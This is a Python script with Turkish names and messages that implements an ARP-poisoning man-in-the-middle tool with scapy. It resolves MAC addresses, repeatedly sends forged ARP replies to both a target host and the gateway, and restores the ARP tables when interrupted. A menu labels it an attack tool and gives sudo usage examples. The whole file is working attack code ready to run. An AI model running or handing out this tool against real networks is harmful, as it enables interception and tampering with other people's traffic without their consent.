import scapy.all as scapy
import time
import optparse
import sys

def mac_adresi_al(ip):
    arp_istegi = scapy.ARP(pdst=ip)
    yayin_paketi = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    paket = yayin_paketi / arp_istegi
    cevaplar = scapy.srp(paket, timeout=1, verbose=False)[0]
    if cevaplar:
        return cevaplar[0][1].hwsrc
    else:
        print(f"{ip} adresine ait MAC adresi bulunamadı!")
        sys.exit()

def arp_zehirle(hedef_ip, zehirli_ip):
    hedef_mac = mac_adresi_al(hedef_ip)
    arp_paketi = scapy.ARP(op=2, pdst=hedef_ip, hwdst=hedef_mac, psrc=zehirli_ip)
    scapy.send(arp_paketi, verbose=False)

def arp_sifirla(aldatilan_ip, ag_ip):
    aldatilan_mac = mac_adresi_al(aldatilan_ip)
    ag_mac = mac_adresi_al(ag_ip)
    arp_paketi = scapy.ARP(op=2, pdst=aldatilan_ip, hwdst=aldatilan_mac, psrc=ag_ip, hwsrc=ag_mac)
    scapy.send(arp_paketi, verbose=False, count=6)

def kullanim_klavuzu():
    print("""
╔════════════════════════════════════╗
║          Ortadaki Adam Saldırısı   ║
╠════════════════════════════════════╣
║ 1 - Saldırı Başlat                 ║
║ 2 - Kullanım Kılavuzunu Göster     ║
║ 3 - Çıkış                          ║
╚════════════════════════════════════╝

Kullanım:
sudo python3 ag_arp.py -t <hedef_ip> -g <gateway_ip>

Örnek:
sudo python3 ag_arp.py -t 192.168.1.5 -g 192.168.1.1

Not: Bu işlem için root (sudo) yetkisi gereklidir.

Devam etmek için ENTER tuşuna basın...
""")
    input()

def menu():
    while True:
        print("\n--- Ortadaki Adam Saldırı Aracı ---")
        print("1 - Saldırı Başlat")
        print("2 - Kullanım Kılavuzunu Göster")
        print("3 - Çıkış")
        secim = input("Seçiminiz: ")

        if secim == "1":
            parser = optparse.OptionParser()
            parser.add_option("-t", "--target", dest="hedef_ip", help="Hedef IP adresi")
            parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP adresi")

            (options, args) = parser.parse_args()

            if not options.hedef_ip or not options.gateway_ip:
                print("Lütfen hedef ve gateway IP adreslerini belirtin!")
                continue

            print(f"Saldırı başlatılıyor. Hedef: {options.hedef_ip} - Gateway: {options.gateway_ip}")
            sayac = 0
            try:
                while True:
                    arp_zehirle(options.hedef_ip, options.gateway_ip)
                    arp_zehirle(options.gateway_ip, options.hedef_ip)
                    sayac += 2
                    print(f"\rGönderilen paket sayısı: {sayac}", end="")
                    time.sleep(3)
            except KeyboardInterrupt:
                print("\nSaldırı durduruldu. Ağ resetleniyor...")
                arp_sifirla(options.hedef_ip, options.gateway_ip)
                arp_sifirla(options.gateway_ip, options.hedef_ip)
                print("Ağ resetlendi. Programdan çıkılıyor.")
                break

        elif secim == "2":
            kullanim_klavuzu()

        elif secim == "3":
            print("Çıkılıyor...")
            break

        else:
            print("Geçersiz seçim, lütfen tekrar deneyin.")

if __name__ == "__main__":
    menu()
